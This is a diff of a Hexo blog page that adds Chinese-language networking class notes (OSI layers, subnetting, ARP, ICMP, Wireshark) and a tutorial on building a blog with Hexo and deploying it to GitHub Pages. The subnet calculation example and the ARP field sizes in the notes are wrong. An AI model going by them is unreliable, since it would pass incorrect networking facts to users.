@@ -258,6 +258,644 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%803/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/hearder.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="South'D 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%803/" itemprop="url">计算机网络基础OSI七层理论</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T01:04:15+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
+                    <span itemprop="name">计算机基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h1><h3 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h3><ul>
+<li>线：双绞线，RJ45，水晶头</li>
+<li>网卡：</li>
+<li>hub：集线器，在物理上将信号放大，在逻辑上相当于电线</li>
+<li>交换机：OSI二层，mac-&gt;mac</li>
+<li>路由器：osi三层，ip-&gt;ip</li>
+</ul>
+<h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><ul>
+<li>校园拓扑 /北邮</li>
+<li>WAN</li>
+<li>LAN</li>
+<li>internet</li>
+<li>局域网(LAN)-&gt;路由-&gt;互联网(WAN)</li>
+<li>网络拓扑图</li>
+<li></li>
+</ul>
+<h3 id="OSI"><a href="#OSI" class="headerlink" title="OSI"></a>OSI</h3><ul>
+<li><p>物理层/数据链路层/网络层/传输层/会话层/表示层/应用层</p>
+</li>
+<li><p>tcp/ip 四层 数据链路层/网络层/传输层/应用层</p>
+</li>
+<li><p>5层教学模型<strong>attention:非真</strong></p>
+<p>物理层/数据链路层/网络层/传输层/应用层</p>
+<p>计算机网络-谢希仁</p>
+<p>《TCP/IP卷一》</p>
+<p>《图解TCP/IP》-日本</p>
+</li>
+</ul>
+<h3 id="GNS3模拟环境"><a href="#GNS3模拟环境" class="headerlink" title="GNS3模拟环境"></a>GNS3模拟环境</h3><ul>
+<li><p><a href="https://blog.csdn.net/zhangpeterx/article/details/86407065#%09_43" target="_blank" rel="noopener">GNS3安装和使用教程</a></p>
+</li>
+<li><p>路由配置-实现连接两个网段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">interface f0&#x2F;0</span><br><span class="line">ip address 192.168.0.1 255.255.255.0</span><br><span class="line">no shut</span><br><span class="line">end</span><br><span class="line">write</span><br><span class="line"></span><br><span class="line">interface f0&#x2F;1</span><br><span class="line">ip address 172.16.0.1 255.255.255.0</span><br><span class="line">no shut</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>IP寻址与子网划分</p>
+<ul>
+<li><p>三阶段</p>
+<ul>
+<li>分类ip</li>
+<li>子网划分</li>
+<li>超网</li>
+</ul>
+</li>
+<li><p>网络号+主机号</p>
+<p>全零为本网络</p>
+<p>127为本地</p>
+<p>网络号全1为全部主机<br><img src="C:/Users/jyufu/AppData/Roaming/Typora/typora-user-images/image-20191105094047471.png" alt="image-20191105094047471"></p>
+</li>
+<li><p>组播</p>
+<p>224.0.0.0-239.255.255.255</p>
+</li>
+<li><p>私网</p>
+<p>10.xxx</p>
+<p>172.16.x.x-172.31.x.x</p>
+<p>192.168.x.x-192.168.255.255</p>
+</li>
+<li><p>超网</p>
+<p>根据子网掩码（两种形式例/18 == 255.255.192.0）</p>
+<p>快速计算所属网络号跟广播地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line">141.14.75.55&#x2F;18</span><br><span class="line">2^(24-18)&#x3D;64</span><br><span class="line">72&#x2F;64&#x3D;1,1*64&#x3D;64</span><br><span class="line">得到网段号141.14.75.64 广播地址为64+63&#x3D;127</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>———————————————————11.06————————————————————————–</p>
+<h3 id="路由寻址"><a href="#路由寻址" class="headerlink" title="路由寻址"></a>路由寻址</h3><ol>
+<li>比较本机网段与目标网段</li>
+<li>查询路由表，没有结果则发到默认网关</li>
+<li>网关（路由）比较各接口的网段，把包转到与目标地址相同的网段接口</li>
+</ol>
+<ul>
+<li>待办 ip route</li>
+</ul>
+<h3 id="以太网协议"><a href="#以太网协议" class="headerlink" title="以太网协议"></a>以太网协议</h3><ul>
+<li>目的MAC地址+源MAC地址+下层类型</li>
+<li>MTU 1500字节</li>
+</ul>
+<h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><ul>
+<li><p>ARP高速缓存-存储局域网内IP地址对应MAC地址</p>
+</li>
+<li><p><code>arp -a</code></p>
+</li>
+<li><p>请求ARP请求分组数据包，由目的主机响应</p>
+</li>
+<li><p>协议内容</p>
+<p>(1) 硬件类型字段，以太网ETHERNET值为1</p>
+<p>(2) 网络层协议</p>
+<p>(3) 硬件地址长度</p>
+<p>(4) 协议长度</p>
+<p>(5)操作字段 ARP请求为1 ，ARP响应为2，RARP请求为3，RARP响应为4</p>
+<p>(6) 发送方的硬件地址（3+3字节）</p>
+<p>(7) 发送方IP（2+2字节）</p>
+<p>(8) 目的硬件地址（2+4字节分段）</p>
+<p>(9) 目的IP地址（3字节）</p>
+</li>
+<li><p>主机硬件地址变化后，无偿发送ARP的广播，目的源IP地址都是自己，MAC地址全零</p>
+</li>
+</ul>
+<h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><ul>
+<li><p>20字节</p>
+</li>
+<li><p>片偏移，字节为单位</p>
+</li>
+<li><h4 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h4><ul>
+<li>time to live</li>
+<li>linux:<code>traceroute</code>  windows: <code>tracert</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="ICMP协议（Internet-control-Message-Protocol）"><a href="#ICMP协议（Internet-control-Message-Protocol）" class="headerlink" title="ICMP协议（Internet control Message Protocol）"></a>ICMP协议（Internet control Message Protocol）</h3><ul>
+<li><p>测试网络故障 </p>
+<p>PING （packet Internet grouper）</p>
+<p>8/0 回送请求或回答 echo包</p>
+<p>13/14 时间戳 请求或回答</p>
+</li>
+<li><p>差错报文 “双头包”</p>
+<p>3 终点不可达</p>
+<p>11 时间超过</p>
+<p>12 参数问题</p>
+</li>
+</ul>
+<h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><ul>
+<li><p>rst标记实验</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.port &#x3D;&#x3D;8080 &amp;&amp;ip.addr&#x3D;192.168.5.112</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>作业</p>
+<p>分析包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcp_zerowindowrecovery.pcap</span><br><span class="line">tcp_zerowindowdead.pcap</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Blog%E6%90%AD%E5%BB%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/hearder.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="South'D 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/Blog%E6%90%AD%E5%BB%BA/" itemprop="url">Blog搭建</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T00:57:11+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8D%9A%E5%AE%A2/" itemprop="url" rel="index">
+                    <span itemprop="name">博客</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Blog-Hexo-Git"><a href="#Blog-Hexo-Git" class="headerlink" title="Blog = Hexo+Git"></a>Blog = Hexo+Git</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>静态网页生成框架</p>
+<blockquote>
+<p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 </p>
+</blockquote>
+<h3 id="GitHub-Pages"><a href="#GitHub-Pages" class="headerlink" title="GitHub Pages"></a>GitHub Pages</h3><p>  Github Pages 是面向用户、组织和项目开放的公共静态页面搭建托管服 务，站点可以被免费托管在 Github 上，你可以选择使用 Github Pages 默 认提供的域名 github.io 或者自定义域名来发布站点。</p>
+<p>​        Github Pages 支持 自动利用 Jekyll 生成站点，也同样支持纯 HTML 文档，将你的 Jekyll 站 点托管在 Github Pages 上是一个不错的选择。</p>
+<p><u>正是这两个工具，让个人博客搭建轻量快捷 而且<strong>免费</strong></u>。</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Git步骤处理"><a href="#Git步骤处理" class="headerlink" title="Git步骤处理"></a>Git步骤处理</h3><ol>
+<li><p>Windows下，下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>。</p>
+</li>
+<li><p>网页端到<a href="github.com">github</a>网站注册，例：我的用户名<code>southdoorsimon</code>。</p>
+</li>
+<li><p>新建一个仓库(repository)，名为<code>“southdoorsimon.github.io</code>。</p>
+</li>
+<li><p>配置SSH key</p>
+<ul>
+<li><p>cmd命令行输入<code>ssh-keygen -t rsa -C &quot;邮箱地址&quot;</code>, 按三次回车，生成密钥文件。到达用户文件夹下，打开<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容。</p>
+</li>
+<li><p>打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key，tittle可设为你的PC名，Key一栏粘贴。</p>
+</li>
+<li><p>测试是否能连接到GitHub服务器，命令行输入<code>ssh -T git@github.com</code>，若能看见“Hi 你的用户名！…”，说明配置成功。                                     </p>
+</li>
+<li><p>配置GitHub的用户信息，命令行执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;simon7s&quot;&#x2F;&#x2F; 你的github用户名</span><br><span class="line">git config --global user.email  &quot;476505048@qq.com&quot;&#x2F;&#x2F; 填写你的github注册邮箱</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h3><ol>
+<li><p>安装 <a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> (Node.js 版本需不低于 8.6，建议使用 Node.js 10.0 及以上版本)</p>
+</li>
+<li><p>快捷键<code>win + R</code>打开运行，输入<code>CMD</code>,打开命令行，输入以下代码，回车。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>继续命令行输入：（<folder>为自行选择摆放博客网站资料的文件夹）</folder></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>生成网页文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>本地预览</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+
+<p> 打开浏览器访问 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 即可看到新造的博客网页。</p>
+</li>
+<li><p>部署到GitHub</p>
+<ul>
+<li><p>配置博客文件夹根目录<code>_config.yml</code>中有关deploy的部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:liuxianan&#x2F;liuxianan.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">  </span><br><span class="line">    type: git</span><br><span class="line">  repo: git@github.com:simon7s&#x2F;simon7s.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>命令行，安装一个插件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>此时执行部署命令，之前生成的网页文件就上传到Github仓库了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>此时，打开我的博客网站 <a href="kokoisko.github.io">kokoisko.github.io</a>,就能看到跟本地预览一模一样的网页啦。</p>
+</li>
+</ol>
+<h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><h3 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h3><ul>
+<li><p>根目录的<code>_config.yml</code>中的<code>theme:</code> 为主题设置项，个人觉得“Next”主题不错，可改为<code>theme: next</code>，然后重新执行<code>hexo g</code>来重新生成。</p>
+</li>
+<li><p>如果出现一些莫名其妙的问题，可以先执行<code>hexo clean</code>来清理一下public的内容，然后再来重新生成和发布。</p>
+</li>
+</ul>
+<h3 id="完善网页信息"><a href="#完善网页信息" class="headerlink" title="完善网页信息"></a>完善网页信息</h3><p>_config.yml下关于<code>网站</code>内容:</p>
+<h4 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>title</code></td>
+<td>网站标题</td>
+</tr>
+<tr>
+<td><code>subtitle</code></td>
+<td>网站副标题</td>
+</tr>
+<tr>
+<td><code>description</code></td>
+<td>网站描述</td>
+</tr>
+<tr>
+<td><code>keywords</code></td>
+<td>网站的关键词。使用半角逗号 <code>,</code> 分隔多个关键词。</td>
+</tr>
+<tr>
+<td><code>author</code></td>
+<td>您的名字</td>
+</tr>
+<tr>
+<td><code>language</code></td>
+<td>网站使用的语言</td>
+</tr>
+<tr>
+<td><code>timezone</code></td>
+<td>网站时区。Hexo 默认使用您电脑的时区。<a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones" target="_blank" rel="noopener">时区列表</a>。比如说：<code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。</td>
+</tr>
+</tbody></table>
+<h4 id="头像设置"><a href="#头像设置" class="headerlink" title="头像设置"></a>头像设置</h4><p>打开 <strong><em>主题配置文件\</em></strong> 找到<code>Sidebar Avatar</code>字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line">avatar: /images/header.jpg</span><br></pre></td></tr></table></figure>
+
+<h3 id="博客分类管理"><a href="#博客分类管理" class="headerlink" title="博客分类管理"></a>博客分类管理</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul>
+<li><p><em>YAML</em> Front Matter 的使用</p>
+</li>
+<li><p>本人使用的博客MD编辑工具<code>Typora</code>，支持<a href="https://link.jianshu.com?t=http://jekyllrb.com/docs/frontmatter/" target="_blank" rel="noopener">YAML Front Matter</a>。在文章的顶端输入<code>---</code>然后按下<code>Enter</code>键就可生成一个自定义的YAML标记。</p>
+</li>
+<li><p>或者，使用hexo的新建功能，根目录下执行<code>hexo new &#39;your blog tittle&#39;</code>，然后可在<code>_posts</code>下打开名为<em>your blog tittle</em>的md文件开始编辑： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-04-24 15:30:30</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>用这个命令的好处是帮我们自动生成了时间。</p>
+</li>
+</ul>
+<h4 id="创建“分类”选项"><a href="#创建“分类”选项" class="headerlink" title="创建“分类”选项"></a>创建“分类”选项</h4><p>参考自：<a href="https://juejin.im/user/5adebd28f265da0b9265381b" target="_blank" rel="noopener">Hexo 添加分类及标签/骑马纵天下</a></p>
+<ol>
+<li><p>生成“分类”页并添加<code>tpye</code>属性,进入博客目录。执行命令下方命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2019-04-22 14:47:40</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>添加type: “categories”到内容中，添加后是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-04-24 15:30:30</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>保存并关闭文件。</p>
+</li>
+<li><p>给文章添加“categories”属性</p>
+<p>打开需要添加分类的文章，为其添加categories属性。下方的categories:Hexo表示这篇文章添加到到“Hexo”这个分类。注意：一篇文章只会添加到一个分类中，如果是多个默认放到第一个分类中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hexo 添加分类及标签</span><br><span class="line">date: 2017-05-26 12:12:57</span><br><span class="line">categories: Hexo</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了categories: xxx的文章才会被收录到首页的“分类”中。</p>
+<h4 id="创建“标签”选项"><a href="#创建“标签”选项" class="headerlink" title="创建“标签”选项"></a>创建“标签”选项</h4><ul>
+<li><p>同理，参考上一小节。</p>
+</li>
+<li><p>添加多个标签：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hexo 添加分类及标签</span><br><span class="line">date: 2019-10-27 12:12:57</span><br><span class="line">tags: </span><br><span class="line">  - Hexo标签测试</span><br><span class="line">  - 第二个Hexo标签测试</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h4 id="分类-amp-标签"><a href="#分类-amp-标签" class="headerlink" title="分类 &amp; 标签"></a>分类 &amp; 标签</h4><p>_config.yml下关于<code>分类 &amp; 标签</code>内容</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>default_category</code></td>
+<td>默认分类</td>
+<td><code>uncategorized</code></td>
+</tr>
+<tr>
+<td><code>category_map</code></td>
+<td>分类别名</td>
+<td></td>
+</tr>
+<tr>
+<td><code>tag_map</code></td>
+<td>标签别名</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>暂告一段落，欢迎访问我的博客<a href="https://kokoisko.github.io" target="_blank" rel="noopener">kokoisko.github.io</a></p>
+<h1 id="个人博客搭建"><a href="#个人博客搭建" class="headerlink" title="个人博客搭建"></a>个人博客搭建</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>隔了很久时间，快忘记怎么搭建博客了，所以重新搭建一次</p>
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>先去安装nodejs,—&gt;nodejs.org下载</p>
+<p>配置cnpm</p>
+<p>1.配置npm的全局模块的存放路径以及cache的路径，新建node_global和node_cache文件，以下是我的目录文件:</p>
+<p>D:\南门Simon\Blog\搭建\配置npm\node_global</p>
+<p>D:\南门Simon\Blog\搭建\配置npm\node_cache</p>
+<p>2.对npm进行配置，在cmd中分别输入</p>
+<p>npm config set prefix “D:\南门Simon\Blog\搭建\配置npm\node_global”<br>npm config set prefix “D:\南门Simon\Blog\搭建\配置npm\node_cache”</p>
+<p>3.设置淘宝镜像</p>
+<p>npm config set registry <a href="http://registry.cnpmjs.org" target="_blank" rel="noopener">http://registry.cnpmjs.org</a></p>
+<p>4.安装模块测试</p>
+<p>npm install express -g</p>
+<p>5.通过npman下载安装cnpm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm -registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+
+<p>6.输入cnpm -v，不是内部命令的话，新增node_global的path环境配置</p>
+<p><img src="/2020/02/09/Blog%E6%90%AD%E5%BB%BA/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578732897387.png" alt="1578732897387"></p>
+<p>7.输入cnpm -v，成功后会显示版本信息，如下：</p>
+<p><img src="/2020/02/09/Blog%E6%90%AD%E5%BB%BA/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578732949750.png" alt="1578732949750"></p>
+<p><a href="https://www.cnblogs.com/dalyday/p/10664287.html（可参考）" target="_blank" rel="noopener">https://www.cnblogs.com/dalyday/p/10664287.html（可参考）</a></p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>配置hexo</p>
+<p>cnpm install -g hexo-cli</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v（验证）</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir blog   新建blog文件夹     删除是rmdir</span><br><span class="line">cd blog&#x2F;</span><br><span class="line">hexo init 初始化</span><br><span class="line">hexo s   开始，启动命令</span><br><span class="line">good bye   关闭命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/09/Blog%E6%90%AD%E5%BB%BA/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578734496626.png" alt="1578734496626"></p>
+<p>可以看到你的blog在本机的4000端口运行</p>
+<p>hexo n “内容”</p>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>部署到github</p>
+<p>1.登录github，新建一个仓库（new repository）</p>
+<p><img src="/2020/02/09/Blog%E6%90%AD%E5%BB%BA/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578736730952.png" alt="1578736730952"></p>
+<p>SimonFly.github.io(原来的是southdoorsimon.github.io)</p>
+<p>安装一个github部署插件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>
+
+<p>设置config.yml文件</p>
+<p><img src="/2020/02/09/Blog%E6%90%AD%E5%BB%BA/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578735575948.png" alt="1578735575948"></p>
+<p>添加git仓库地址</p>
+<p><img src="/2020/02/09/Blog%E6%90%AD%E5%BB%BA/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578735744502.png" alt="1578735744502"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d  部署到远端</span><br></pre></td></tr></table></figure>
+
+<p>这里可能会报错，原因是ssh公钥还未配置，这里可以翻到上面查看git 的配置教程</p>
+<h2 id><a href="#" class="headerlink" title></a></h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E7%B3%BB%E7%BB%9F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2503,514 +3141,6 @@ cmd &gt;| file
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/hearder.jpg">
